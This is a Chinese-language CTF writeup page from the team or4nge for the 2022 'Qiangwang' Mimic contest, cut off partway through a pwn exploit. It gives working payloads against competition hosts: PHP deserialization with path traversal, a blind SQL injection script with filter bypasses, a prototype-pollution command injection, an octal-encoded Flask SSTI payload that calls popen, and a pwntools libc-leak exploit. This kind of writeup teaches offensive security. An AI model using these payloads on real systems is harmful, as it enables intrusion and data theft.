@@ -1,0 +1,1378 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='CTF大型舞台剧（懂的都懂'><title>“强网”拟态 Writeup by or4nge</title>
+
+<link rel='canonical' href='https://or4ngesec.github.io/post/qwnt-writeup-by-or4nge/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='“强网”拟态 Writeup by or4nge'>
+<meta property='og:description' content='CTF大型舞台剧（懂的都懂'>
+<meta property='og:url' content='https://or4ngesec.github.io/post/qwnt-writeup-by-or4nge/'>
+<meta property='og:site_name' content='or4nge'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Writeup' /><meta property='article:tag' content='“强网”拟态' /><meta property='article:published_time' content='2022-11-07T19:00:00&#43;08:00'/><meta property='article:modified_time' content='2022-11-07T19:00:00&#43;08:00'/>
+<meta name="twitter:title" content="“强网”拟态 Writeup by or4nge">
+<meta name="twitter:description" content="CTF大型舞台剧（懂的都懂">
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Back</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/writeup/" >
+                Writeup
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/post/qwnt-writeup-by-or4nge/">“强网”拟态 Writeup by or4nge</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        CTF大型舞台剧（懂的都懂
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 07, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    11 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h2 id="web">Web</h2>
+<h3 id="ezus">ezus</h3>
+<p>第一层，使用中文绕过basename即可。​
+http://172.51.223.142/index.php/tm.php/%E6%88%91?source​
+第二层的目标是进@include，读hint.php。​
+三个需要绕过的东西：构建反序列化受限用<strong>字符逃逸</strong>，wakeup用<strong>增加属性数</strong>，strpos用<strong>路径穿越</strong>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">username<span style="color:#f92672">=@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@&amp;</span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;;s:11:&#34;</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">*%</span><span style="color:#ae81ff">00</span>password<span style="color:#e6db74">&#34;;O:5:&#34;</span>order<span style="color:#e6db74">&#34;:3:{s:1:&#34;</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;;s:83:&#34;</span>php:<span style="color:#f92672">//</span>filter<span style="color:#f92672">/</span>read<span style="color:#f92672">=</span>convert<span style="color:#f92672">.</span>base64<span style="color:#f92672">-</span>encode<span style="color:#f92672">/</span>resource<span style="color:#f92672">=/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/</span><span style="color:#66d9ef">pass</span><span style="color:#f92672">/../</span><span style="color:#66d9ef">try</span><span style="color:#f92672">/../</span>index<span style="color:#e6db74">&#34;;s:4:&#34;</span>hint<span style="color:#e6db74">&#34;;s:16:&#34;</span>http:<span style="color:#f92672">//</span>locathost<span style="color:#e6db74">&#34;;}}}​</span>
+</code></pre></div><p>第三层，用一个不存在的协议名绕parse_url（parse_url会解析出host，但file_get_contents会将其解析为路径），路径穿越读取即可。​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">username<span style="color:#f92672">=@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@</span><span style="color:#ae81ff">0</span><span style="color:#f92672">@&amp;</span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;;s:11:&#34;</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">*%</span><span style="color:#ae81ff">00</span>password<span style="color:#e6db74">&#34;;O:5:&#34;</span>order<span style="color:#e6db74">&#34;:3:{s:1:&#34;</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;;s:82:&#34;</span>php:<span style="color:#f92672">//</span>filter<span style="color:#f92672">/</span>read<span style="color:#f92672">=</span>convert<span style="color:#f92672">.</span>base64<span style="color:#f92672">-</span>encode<span style="color:#f92672">/</span>resource<span style="color:#f92672">=/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/</span><span style="color:#66d9ef">pass</span><span style="color:#f92672">/../</span><span style="color:#66d9ef">try</span><span style="color:#f92672">/../</span>hint<span style="color:#e6db74">&#34;;s:4:&#34;</span>hint<span style="color:#e6db74">&#34;;s:46:&#34;</span><span style="color:#ae81ff">0</span>:<span style="color:#f92672">//</span>prankhub<span style="color:#f92672">/../../../../../</span>f1111444449999<span style="color:#f92672">.</span>txt<span style="color:#e6db74">&#34;;}}}</span>
+</code></pre></div><h3 id="popsql">Popsql</h3>
+<p>时间盲注，但过滤了非常多的东西。​
+sleep被过滤，用benchmark替代，进行延时。​
+<code>username=admin&amp;password='/**/or/**/if(1,benchmark(1000000000,1),1)#</code>（验证时间盲注存在）
+=，like，regexp全没了，用取模运算代替，进行逐字符判断；​
+ascii被过滤了，用ord代替；​
+substr、left被过滤了，用right代替。​
+此时若提取出的字符是不是模数的倍数，则不会延时，否则会延时。因为这样会时间特别长，在外面加个not。
+<code>username=admin&amp;password='/**/or/**/if((not(select(ord(right(database(),%d)))%%(%d))),benchmark(1000000000,1),1)#&quot; % (i,j)</code>（获取数据库名 ctfgame）​
+<code>username=admin&amp;password='/**/or/**/if((not(select(ord(right(version(),%d)))%%(%d))),benchmark(1000000000,1),1)#&quot; % (i,j)</code>（获取版本号 5.7.39）​
+information被滤，使用sys.schema_table_statistics_with_buffer库获取表名。​
+<code>username=admin&amp;password='/**/or/**/if(not((select/**/ord(right(group_concat(table_name),%d))%%(%d)/**/from/**/sys.schema_table_statistics_with_buffer)),benchmark(1000000000,1),1)#&quot; % (i,j)</code> （获取表名 Fl49ish3re）​
+尝试无列名注入，但没有union；赌表里只有一列，发现不是。​
+<code>username=admin&amp;password='/**/or/**/if((ord(right((select/**/*/**/from/**/Fl49ish3re/**/limit/**/0,1),1))%(52)),benchmark(1000000000,1),1);</code>（表里只有一列情况下的无列名注入）​
+网上搜索，找到flag所处的列名<code>f1aG123​</code>
+<a class="link" href="https://hwwg.github.io/2021/09/17/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/"  target="_blank" rel="noopener"
+    >https://hwwg.github.io/2021/09/17/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/</a>​
+获取flag。​
+<code>&quot;username=admin&amp;password='/**/or/**/if(not(ord(right((select/**/group_concat(f1aG123)/**/from/**/Fl49ish3re),%d))%%(%d)),benchmark(1000000000,1),1)#&quot; % (i, ord(j))</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> time<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">import</span> requests<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">import</span> string<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Content-Type&#34;</span>:<span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
+url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://172.51.223.119/index.php&#34;</span><span style="color:#960050;background-color:#1e0010">​</span>
+proxy<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;http&#34;</span>:<span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>}<span style="color:#960050;background-color:#1e0010">​</span>
+result<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+record<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">​</span>
+s<span style="color:#f92672">=</span>string<span style="color:#f92672">.</span>digits<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">_&#34;</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">200</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> s:<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#75715e">#data = &#34;username=admin&amp;password=&#39;/**/or/**/if(1,benchmark(1000000000,1),1)#&#34;​</span>
+        <span style="color:#75715e">#data = &#34;username=admin&amp;password=&#39;/**/or/**/if((not(select(ord(right(database(),%d)))%%(%d))),benchmark(1000000000,1),1)#&#34; % (i,j)​</span>
+        <span style="color:#75715e">#data = &#34;username=admin&amp;password=&#39;/**/or/**/if((not(select(ord(right(version(),%d)))%%(%d))),benchmark(1000000000,1),1)#&#34; % (i,j)​</span>
+        <span style="color:#75715e">#data = &#34;username=admin&amp;password=&#39;/**/or/**/if(not((select/**/ord(right(group_concat(table_name),%d))%%(%d)/**/from/**/sys.schema_table_statistics_with_buffer)),benchmark(1000000000,1),1)#&#34; % (i,j)​</span>
+        <span style="color:#75715e">##data = &#34;username=admin&amp;password=&#39;/**/or/**/if((select/**/ord(right(group_concat(concat(table_name,column_name)),%d))%%(%d)/**/from/**/sys.schema_auto_increment_columns),benchmark(1000000000,1),1)#&#34; % (i, j)​</span>
+        data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username=admin&amp;password=&#39;/**/or/**/if(not(ord(right((select/**/group_concat(f1aG123)/**/from/**/Fl49ish3re),</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">))</span><span style="color:#e6db74">%%</span><span style="color:#e6db74">(</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">)),benchmark(1000000000,1),1)#&#34;</span> <span style="color:#f92672">%</span> (i, ord(j))<span style="color:#960050;background-color:#1e0010">​</span>
+        t <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#75715e">#req=requests.post(url,data=data,proxies=proxy,headers=headers)​</span>
+        req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data,headers<span style="color:#f92672">=</span>headers)<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">if</span> time<span style="color:#f92672">.</span>time()<span style="color:#f92672">-</span>t<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+            record <span style="color:#f92672">=</span> ord(j)<span style="color:#960050;background-color:#1e0010">​</span>
+            <span style="color:#66d9ef">break</span><span style="color:#960050;background-color:#1e0010">​</span>
+        print(data)<span style="color:#960050;background-color:#1e0010">​</span>
+        print(time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> t)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+    result<span style="color:#f92672">+=</span>chr(record)<span style="color:#960050;background-color:#1e0010">​</span>
+    print(result)
+</code></pre></div><h3 id="whoyouare">WHOYOUARE</h3>
+<p>原型链污染​
+payload：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JavaScript" data-lang="JavaScript">{<span style="color:#e6db74">&#34;user&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;{\&#34;constructor\&#34;:{\&#34;prototype\&#34;:{\&#34;1\&#34;:\&#34;cat /flag\&#34;}},\&#34;command\&#34;:[]}&#34;</span>}
+</code></pre></div><p>污染source的原型，在key=1时通过source原型的值覆盖原来那个[-c,id]里面的id为自己的可控命令，实现任命令执行。​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JavaScript" data-lang="JavaScript"><span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span>  { <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;guest&#39;</span>, <span style="color:#a6e22e">command</span><span style="color:#f92672">:</span> [ <span style="color:#e6db74">&#39;-c&#39;</span>, <span style="color:#e6db74">&#39;cat /flag&#39;</span> ] }
+</code></pre></div><h3 id="没有人比我更懂py">没有人比我更懂py​</h3>
+<p>flask_SSTI注入，过滤了所有字母。​
+八进制绕过即可，剩下的和NewStar新生赛第四周那题差不多。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">x<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;原始payload&#34;</span><span style="color:#960050;background-color:#1e0010">​</span>
+y<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+s<span style="color:#f92672">=</span>string<span style="color:#f92672">.</span>ascii_letters<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(x)):<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">if</span> x[i] <span style="color:#f92672">in</span> s:<span style="color:#960050;background-color:#1e0010">​</span>
+        y<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;\</span><span style="color:#e6db74">%o</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> ord(x[i])<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">else</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+        y<span style="color:#f92672">+=</span>x[i]<span style="color:#960050;background-color:#1e0010">​</span>
+print(y)
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{<span style="color:#e6db74">&#39;&#39;</span>[<span style="color:#e6db74">&#39;__</span><span style="color:#ae81ff">\143\154\141\163\163</span><span style="color:#e6db74">__&#39;</span>][<span style="color:#e6db74">&#39;__</span><span style="color:#ae81ff">\142\141\163\145\163</span><span style="color:#e6db74">__&#39;</span>][<span style="color:#e6db74">&#39;__</span><span style="color:#ae81ff">\147\145\164\151\164\145\155</span><span style="color:#e6db74">__&#39;</span>](<span style="color:#ae81ff">0</span>)[<span style="color:#e6db74">&#39;__</span><span style="color:#ae81ff">\163\165\142\143\154\141\163\163\145\163</span><span style="color:#e6db74">__&#39;</span>]()[<span style="color:#e6db74">&#39;__</span><span style="color:#ae81ff">\147\145\164\151\164\145\155</span><span style="color:#e6db74">__&#39;</span>](<span style="color:#ae81ff">132</span>)[<span style="color:#e6db74">&#39;__</span><span style="color:#ae81ff">\151\156\151\164</span><span style="color:#e6db74">__&#39;</span>][<span style="color:#e6db74">&#39;__</span><span style="color:#ae81ff">\147\154\157\142\141\154\163</span><span style="color:#e6db74">__&#39;</span>][<span style="color:#e6db74">&#39;__</span><span style="color:#ae81ff">\147\145\164\151\164\145\155</span><span style="color:#e6db74">__&#39;</span>](<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\160\157\160\145\156</span><span style="color:#e6db74">&#39;</span>)(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\143\141\164</span><span style="color:#e6db74"> /</span><span style="color:#ae81ff">\146\154\141\147</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\162\145\141\144</span><span style="color:#e6db74">&#39;</span>]()}}
+</code></pre></div><h2 id="pwn">Pwn</h2>
+<h3 id="bfbf">bfbf</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">import</span> sys<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e"># context.log_level = &#34;debug&#34;​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">else</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">if</span> debug:<span style="color:#960050;background-color:#1e0010">​</span>
+    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./pwn&#39;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">else</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;172.51.223.12&#34;</span>, <span style="color:#ae81ff">9999</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+ru <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)<span style="color:#960050;background-color:#1e0010">​</span>
+sn <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>send(x)<span style="color:#960050;background-color:#1e0010">​</span>
+rl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> : p<span style="color:#f92672">.</span>recvline()<span style="color:#960050;background-color:#1e0010">​</span>
+sl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>sendline(x)<span style="color:#960050;background-color:#1e0010">​</span>
+rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recv(x)<span style="color:#960050;background-color:#1e0010">​</span>
+sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendafter(a,b)<span style="color:#960050;background-color:#1e0010">​</span>
+sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendlineafter(a, b)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">debugf</span>(b<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    <span style="color:#66d9ef">if</span> debug:<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">if</span> b:<span style="color:#960050;background-color:#1e0010">​</span>
+            gdb<span style="color:#f92672">.</span>attach(p,<span style="color:#e6db74">&#34;b *$rebase(</span><span style="color:#e6db74">{b}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>format(b <span style="color:#f92672">=</span> hex(b)))<span style="color:#960050;background-color:#1e0010">​</span>
+        <span style="color:#66d9ef">else</span>:<span style="color:#960050;background-color:#1e0010">​</span>
+            gdb<span style="color:#f92672">.</span>attach(p)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+main_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1982</span><span style="color:#960050;background-color:#1e0010">​</span>
+main_read <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x17e3</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+rl()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x228</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e"># libc​</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):<span style="color:#960050;background-color:#1e0010">​</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&gt;&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e"># payload += b&#39;&lt;&#39; *0x58​</span>
+<span style="color:#960050;background-color:#1e0010">​</span>
+debugf(<span style="color:#ae81ff">0x1982</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#75715e"># raw_input(&#39;&gt; &#39;)​</span>
+sl(payload)<span style="color:#960050;background-color:#1e0010">​</span>
+sleep(<span style="color:#ae81ff">1</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+leak <span style="color:#f92672">=</span> u64(rv(<span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#960050;background-color:#1e0010">​</span>
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak  <span style="color:#f92672">-</span><span style="color:#ae81ff">0x24083</span><span style="color:#960050;background-color:#1e0010">​</span>
